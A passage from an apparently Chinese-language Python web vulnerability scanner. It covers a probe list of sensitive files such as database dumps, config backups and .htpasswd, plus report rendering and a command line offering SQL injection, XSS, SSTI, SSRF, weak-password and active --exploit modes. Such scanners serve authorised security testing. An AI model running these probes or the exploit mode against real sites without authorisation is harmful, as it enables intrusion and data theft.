                              "backup.sql", "db.sql", "dump.sql", "backup.zip",
                              "backup.tar.gz", "config.php.bak", "wp-config.php.bak",
                              "web.config.bak", ".htpasswd", "phpinfo.php", "info.php")
                self.report.add(Finding(
                    title=f"敏感路径暴露: /{path}",
                    severity="high" if path in high_value else "low",
                    description=f"/{path} 返回 200，状态码 {resp.status_code}，长度 {len(resp.content)} B。",
                    evidence=full,
                    recommendation="移除敏感文件 / 限制访问 / 配置访问控制。",
                    url=full,
                ))


@dataclass
class FormInfo:
    index: int
    action: str
    method: str
    fields: list
    is_login_like: bool = False


# ----------------------------------------------------------------------
# 报告渲染
# ----------------------------------------------------------------------

def render_console(report: ScanReport) -> None:
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"扫描报告 | {report.target}")
    print(f"开始 {report.started_at}  结束 {report.finished_at}")
    print('='*60 + Style.RESET_ALL)
    for f in report.sorted_findings():
        color = SEVERITY_COLOR.get(f.severity, "")
        print(f"{color}[{f.severity.upper():8}] {f.title}{Style.RESET_ALL}")
        print(f"          {f.description}")
        if f.evidence:
            print(f"          证据: {f.evidence}")
        if f.recommendation:
            print(f"          建议: {f.recommendation}")
        print()
    s = report.by_severity
    print(f"{Fore.CYAN}合计 {sum(s.values())} 项："
          f"严重 {s['critical']}  高危 {s['high']}  中危 {s['medium']}  低危 {s['low']}  信息 {s['info']}"
          f"{Style.RESET_ALL}")

    if report.exploits:
        print(f"\n{Fore.MAGENTA}{Style.BRIGHT}=== 后台取证 / 漏洞利用证据 ==={Style.RESET_ALL}")
        for ev in report.exploits:
            tag = f"{Fore.GREEN}[成功]{Style.RESET_ALL}" if ev.success else f"{Fore.YELLOW}[未成功]{Style.RESET_ALL}"
            print(f"{tag} {ev.technique}  ({ev.target})")
            for k, v in ev.data.items():
                vstr = ", ".join(v) if isinstance(v, list) else str(v)
                print(f"          - {k}: {vstr[:120]}")
            if ev.excerpt:
                print(f"          摘录: {ev.excerpt[:160]}")
            print()


def save_reports(report: ScanReport, out_dir: str = "reports") -> tuple[str, str, str]:
    os.makedirs(out_dir, exist_ok=True)
    stamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_target = re.sub(r"[^A-Za-z0-9._-]", "_", report.target)
    safe_target = safe_target[:80]
    base = f"{safe_target}_{stamp}"
    json_path = os.path.join(out_dir, base + ".json")
    html_path = os.path.join(out_dir, base + ".html")
    pdf_path = os.path.join(out_dir, base + ".pdf")

    with open(json_path, "w", encoding="utf-8") as f:
        json.dump({
            "target": report.target,
            "started_at": report.started_at,
            "finished_at": report.finished_at,
            "summary": report.summary,
            "findings": [asdict(x) for x in report.sorted_findings()],
            "exploits": [asdict(x) for x in report.exploits],
        }, f, ensure_ascii=False, indent=2)

    html = build_html(report)
    with open(html_path, "w", encoding="utf-8") as f:
        f.write(html)

    try:
        build_pdf(report, pdf_path)
    except Exception as e:
        print(f"{Fore.YELLOW}[!] PDF 生成失败：{e}（JSON/HTML 报告仍已生成）{Style.RESET_ALL}")
        pdf_path = ""
    return json_path, html_path, pdf_path


def _find_cjk_font() -> Optional[str]:
    # 1) 优先：与 exe / 脚本同目录或 PyInstaller 解包目录（打包内置字体）
    bundle_dirs = []
    if getattr(sys, "_MEIPASS", None):
        bundle_dirs.append(sys._MEIPASS)
    bundle_dirs.append(os.path.dirname(os.path.abspath(sys.executable if getattr(sys, "frozen", False)
                                                      else __file__)))
    for d in bundle_dirs:
        for name in ("simhei.ttf", "msyh.ttc", "simsun.ttc"):
            p = os.path.join(d, name)
            if os.path.exists(p):
                return p
    # 2) 回退：系统字体目录
    candidates = [
        r"C:\Windows\Fonts\simhei.ttf",
        r"C:\Windows\Fonts\msyh.ttc",
        r"C:\Windows\Fonts\simsun.ttc",
        r"C:\Windows\Fonts\msyhl.ttc",
        "/usr/share/fonts/truetype/wqy/wqy-microhei.ttc",
        "/System/Library/Fonts/PingFang.ttc",
    ]
    for p in candidates:
        if os.path.exists(p):
            return p
    return None


def build_pdf(report: ScanReport, path: str) -> None:
    from fpdf import FPDF

    font_path = _find_cjk_font()
    pdf = FPDF(orientation="L", unit="mm", format="A4")
    pdf.set_auto_page_break(auto=True, margin=15)
    if font_path:
        pdf.add_font("CJK", "", font_path)
        pdf.add_font("CJK", "B", font_path)
        font_family = "CJK"
    else:
        font_family = "Helvetica"

    sev_label = {"critical": "严重", "high": "高危", "medium": "中危", "low": "低危", "info": "信息"}
    sev_rgb = {
        "critical": (123, 31, 162),
        "high": (198, 40, 40),
        "medium": (249, 168, 37),
        "low": (21, 101, 192),
        "info": (69, 90, 100),
    }

    pdf.add_page()
    pdf.set_font(font_family, "B", 18)
    pdf.set_text_color(31, 58, 95)
    pdf.cell(0, 12, "漏洞扫描报告", new_x="LMARGIN", new_y="NEXT")
    pdf.set_font(font_family, "", 10)
    pdf.set_text_color(80, 80, 80)
    pdf.cell(0, 7, f"目标：{report.target}", new_x="LMARGIN", new_y="NEXT")
    pdf.cell(0, 7, f"开始 {report.started_at}    结束 {report.finished_at}", new_x="LMARGIN", new_y="NEXT")

    s = report.by_severity
    pdf.ln(3)
    pdf.set_font(font_family, "B", 11)
    pdf.set_text_color(20, 20, 20)
    summary = (f"合计 {sum(s.values())} 项    "
               f"严重 {s['critical']}   高危 {s['high']}   中危 {s['medium']}   "
               f"低危 {s['low']}   信息 {s['info']}")
    pdf.cell(0, 8, summary, new_x="LMARGIN", new_y="NEXT")
    pdf.ln(2)

    # 表头
    col_w = [16, 55, 75, 60, 60]
    headers = ["级别", "问题", "描述", "证据", "建议"]
    pdf.set_font(font_family, "B", 9)
    pdf.set_fill_color(31, 58, 95)
    pdf.set_text_color(255, 255, 255)
    for w, h in zip(col_w, headers):
        pdf.cell(w, 8, h, border=1, align="C", fill=True)
    pdf.ln()

    pdf.set_font(font_family, "", 8)
    for f in report.sorted_findings():
        r, g, b = sev_rgb.get(f.severity, (80, 80, 80))
        # 计算各列所需行高（按最长文本）
        cells = [sev_label.get(f.severity, f.severity), f.title, f.description, f.evidence, f.recommendation]
        line_counts = []
        for txt, w in zip(cells, col_w):
            txt = str(txt) if txt else "-"
            # 估算每列可容纳字符数（CJK 约占 2 个单位宽度）
            approx_chars = max(1, int((w - 4) / 1.7))
            lines = max(1, -(-len(txt) // approx_chars))  # 向上取整
            line_counts.append(lines)
        row_h = max(line_counts) * 4.6 + 2

        if pdf.get_y() + row_h > pdf.h - 15:
            pdf.add_page()

        x_start = pdf.get_x()
        y_start = pdf.get_y()
        for i, (txt, w) in enumerate(zip(cells, col_w)):
            txt = str(txt) if txt else "-"
            if i == 0:
                pdf.set_text_color(r, g, b)
                pdf.set_font(font_family, "B", 8)
            else:
                pdf.set_text_color(30, 30, 30)
                pdf.set_font(font_family, "", 8)
            x = x_start + sum(col_w[:i])
            pdf.set_xy(x, y_start)
            pdf.multi_cell(w, 4.6, txt, border=1, align="L")
        pdf.set_xy(x_start, y_start + row_h)

    # ---- 后台取证 / 漏洞利用证据 ----
    if report.exploits:
        pdf.ln(4)
        pdf.set_font(font_family, "B", 13)
        pdf.set_text_color(123, 31, 162)
        pdf.cell(0, 8, "后台取证 / 漏洞利用证据",
                 new_x="LMARGIN", new_y="NEXT")
        ev_col_w = [22, 60, 100, 84]
        ev_headers = ["结果", "技术 / 目标", "提取到的信息", "摘录"]
        pdf.set_font(font_family, "B", 9)
        pdf.set_fill_color(123, 31, 162)
        pdf.set_text_color(255, 255, 255)
        for w, h in zip(ev_col_w, ev_headers):
            pdf.cell(w, 8, h, border=1, align="C", fill=True)
        pdf.ln()
        pdf.set_font(font_family, "", 8)
        for ev in report.exploits:
            data_txt = "\n".join(
                f"{k}: {', '.join(v) if isinstance(v, list) else v}"
                for k, v in ev.data.items()) or "—"
            cells = ["成功" if ev.success else "未成功",
                     f"{ev.technique}\n({ev.target})", data_txt, ev.excerpt or "—"]
            line_counts = []
            for txt, w in zip(cells, ev_col_w):
                approx = max(1, int((w - 4) / 1.7))
                line_counts.append(max(1, -(-max(1, len(str(txt))) // approx)))
            row_h = max(line_counts) * 4.6 + 2
            if pdf.get_y() + row_h > pdf.h - 15:
                pdf.add_page()
            x0, y0 = pdf.get_x(), pdf.get_y()
            for i, (txt, w) in enumerate(zip(cells, ev_col_w)):
                txt = str(txt) if txt else "-"
                if i == 0:
                    pdf.set_text_color(46, 125, 50) if ev.success else (249, 168, 37)
                    pdf.set_font(font_family, "B", 8)
                else:
                    pdf.set_text_color(30, 30, 30)
                    pdf.set_font(font_family, "", 8)
                pdf.set_xy(x0 + sum(ev_col_w[:i]), y0)
                pdf.multi_cell(w, 4.6, txt, border=1, align="L")
            pdf.set_xy(x0, y0 + row_h)

    pdf.ln(4)
    pdf.set_font(font_family, "", 7)
    pdf.set_text_color(150, 150, 150)
    pdf.cell(0, 6, "本报告由 VulnScanner 生成，仅用于授权安全测试。扫描结果需结合人工复核确认。",
             new_x="LMARGIN", new_y="NEXT")
    pdf.output(path)


def build_html(report: ScanReport) -> str:
    rows = ""
    sev_label = {"critical": "严重", "high": "高危", "medium": "中危", "low": "低危", "info": "信息"}
    for f in report.sorted_findings():
        rows += f"""
        <tr class="sev-{f.severity}">
          <td>{sev_label.get(f.severity, f.severity)}</td>
          <td>{escape_html(f.title)}</td>
          <td>{escape_html(f.description)}</td>
          <td>{escape_html(f.evidence)}</td>
          <td>{escape_html(f.recommendation)}</td>
          <td class="url">{escape_html(f.url)}</td>
        </tr>"""
    # 后台取证 / 利用证据
    exploit_html = ""
    if report.exploits:
        ev_rows = ""
        for ev in report.exploits:
            data_lines = "<br>".join(
                f"<b>{escape_html(k)}:</b> {escape_html(', '.join(v) if isinstance(v, list) else v)}"
                for k, v in ev.data.items()) or "—"
            tag = '<span style="color:#2e7d32">✓ 成功</span>' if ev.success \
                else '<span style="color:#f9a825">未成功</span>'
            ev_rows += f"""
            <tr>
              <td>{tag}</td>
              <td>{escape_html(ev.technique)}<br><span style="color:#888">{escape_html(ev.target)}</span></td>
              <td>{data_lines}</td>
              <td>{escape_html(ev.excerpt)}</td>
            </tr>"""
        exploit_html = f"""
        <h2 style="color:#7b1fa2;margin-top:1.5rem">后台取证 / 漏洞利用证据</h2>
        <table>
          <tr><th style="width:70px">结果</th><th style="width:220px">技术 / 目标</th><th>提取到的信息</th><th style="width:30%">摘录</th></tr>
          {ev_rows}
        </table>"""
    s = report.by_severity
    return f"""<!DOCTYPE html>
<html lang="zh-CN"><head><meta charset="utf-8">
<title>漏洞扫描报告 - {escape_html(report.target)}</title>
<style>
  body {{ font-family: "Microsoft YaHei", Arial, sans-serif; margin: 2rem; background:#f7f8fa; color:#222; }}
  h1 {{ color:#1f3a5f; }}
  .meta {{ color:#666; margin-bottom:1rem; }}
  .summary span {{ display:inline-block; padding:.3rem .8rem; margin-right:.4rem; border-radius:4px; color:#fff; font-weight:bold; }}
  .s-critical{{background:#7b1fa2}} .s-high{{background:#c62828}} .s-medium{{background:#f9a825;color:#222}}
  .s-low{{background:#1565c0}} .s-info{{background:#455a64}}
  table {{ border-collapse:collapse; width:100%; background:#fff; box-shadow:0 1px 3px rgba(0,0,0,.08); margin-bottom:1rem; }}
  th,td {{ border:1px solid #e0e0e0; padding:.5rem .6rem; text-align:left; vertical-align:top; font-size:.9rem; }}
  th {{ background:#1f3a5f; color:#fff; }}
  tr.sev-critical td:first-child,tr.sev-high td:first-child{{font-weight:bold}}
  tr.sev-critical{{background:#fbe9f3}} tr.sev-high{{background:#ffebee}}
  tr.sev-medium{{background:#fff8e1}} tr.sev-low{{background:#e3f2fd}}
  td.url{{max-width:260px;word-break:break-all;color:#1976d2}}
</style></head><body>
<h1>漏洞扫描报告</h1>
<div class="meta">目标：<b>{escape_html(report.target)}</b><br>
开始 {escape_html(report.started_at)}　结束 {escape_html(report.finished_at)}</div>
<div class="summary">
  <span class="s-critical">严重 {s['critical']}</span>
  <span class="s-high">高危 {s['high']}</span>
  <span class="s-medium">中危 {s['medium']}</span>
  <span class="s-low">低危 {s['low']}</span>
  <span class="s-info">信息 {s['info']}</span>
</div>
<table>
  <tr><th>级别</th><th>问题</th><th>描述</th><th>证据</th><th>建议</th><th>URL</th></tr>
  {rows}
</table>
{exploit_html}
<p style="margin-top:1rem;color:#888;font-size:.8rem">
本报告由 VulnScanner 生成，仅用于授权安全测试。扫描结果需结合人工复核确认。
</p>
</body></html>"""


def escape_html(s: str) -> str:
    return (str(s).replace("&", "&amp;").replace("<", "&lt;")
            .replace(">", "&gt;").replace('"', "&quot;"))


# ----------------------------------------------------------------------
# 入口
# ----------------------------------------------------------------------

BANNER = r"""
 __     __   _   _   ____    _    ____   _____ __  __  _____ ____
 \ \   / /  | | | | | __ )  / \  / ___| | ____|  \/  | ____/ ___|
  \ \ / /   | | | | |  _ \ / _  \ \___ \|  _| | |\/| |  _| \___ \
   \ V /    | |_| | | |_) / ___ \ ___) | |___| |  | | |___ ___) |
    \_/      \___/  |____/_/   \_\____/|_____|_|  |_|_____|____/
"""


def main() -> int:
    print(f"{Fore.GREEN}{BANNER}{Style.RESET_ALL}")
    parser = argparse.ArgumentParser(
        description="登录网址漏洞扫描工具（仅用于授权安全测试）")
    parser.add_argument("url", help="目标登录页 URL，例如 https://example.com/login")
    parser.add_argument("--timeout", type=int, default=10, help="请求超时秒数")
    parser.add_argument("--no-sql", action="store_true", help="跳过 SQL 注入探测")
    parser.add_argument("--no-xss", action="store_true", help="跳过 XSS 探测")
    parser.add_argument("--no-paths", action="store_true", help="跳过敏感路径探测")
    parser.add_argument("--no-creds", action="store_true", help="跳过弱口令 / 用户枚举探测")
    parser.add_argument("--no-ssti", action="store_true", help="跳过 SSTI 探测")
    parser.add_argument("--no-ssrf", action="store_true", help="跳过 SSRF 探测")
    parser.add_argument("--no-redirect", action="store_true", help="跳过开放重定向探测")
    parser.add_argument("--no-upload", action="store_true", help="跳过文件上传检测")
    parser.add_argument("--exploit", action="store_true",
                        help="发现可确认漏洞时，尝试利用并提取后台信息（主动利用，需授权）")
    parser.add_argument("--crawl-depth", type=int, default=0,
                        help="站点爬虫深度（0=仅扫描给定 URL，默认 0）")
    parser.add_argument("--crawl-max-pages", type=int, default=15,
                        help="爬虫最多抓取页面数（默认 15）")
    parser.add_argument("--login-url", help="认证后扫描：登录接口 URL")
    parser.add_argument("--login-user-field", default="username", help="登录表单用户名字段名")
    parser.add_argument("--login-pwd-field", default="password", help="登录表单密码字段名")
    parser.add_argument("--login-user", help="登录用户名")
    parser.add_argument("--login-password", help="登录密码")
    parser.add_argument("--cookie", help="认证后扫描：直接粘贴 Cookie 字符串")
    parser.add_argument("--ua", default=DEFAULT_UA, help="自定义 User-Agent")
    parser.add_argument("--out", default="reports", help="报告输出目录")
    args = parser.parse_args()

    if not args.url:
        parser.error("请提供目标 URL")

    if args.exploit:
        print(f"{Fore.RED}[!] 已启用利用取证（--exploit）。该操作将主动利用已发现漏洞并提取信息，"
              f"属于侵入性操作。请确认已获得书面授权。{Style.RESET_ALL}")

    auth = None
    if args.login_url and args.login_user and args.login_password:
        auth = {
            "login_url": args.login_url,
            "user_field": args.login_user_field,
            "pwd_field": args.login_pwd_field,
            "user": args.login_user,
            "password": args.login_password,
        }

    scanner = VulnScanner(
        args.url, timeout=args.timeout, ua=args.ua,
        do_sql=not args.no_sql, do_xss=not args.no_xss,
        do_paths=not args.no_paths, do_creds=not args.no_creds,
        do_exploit=args.exploit,
        crawl_depth=args.crawl_depth, crawl_max_pages=args.crawl_max_pages,
        auth=auth, cookie=args.cookie,
        do_ssti=not args.no_ssti, do_ssrf=not args.no_ssrf,
        do_redirect=not args.no_redirect, do_upload=not args.no_upload,
    )
    report = scanner.run()
    render_console(report)
    json_path, html_path, pdf_path = save_reports(report, args.out)
    print(f"\n{Fore.GREEN}[+] 报告已生成：\n    JSON: {json_path}\n    HTML: {html_path}")
    if pdf_path:
        print(f"    PDF : {pdf_path}{Style.RESET_ALL}")
    else:
        print(f"{Style.RESET_ALL}")
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] 用户中断{Style.RESET_ALL}")
        sys.exit(130)
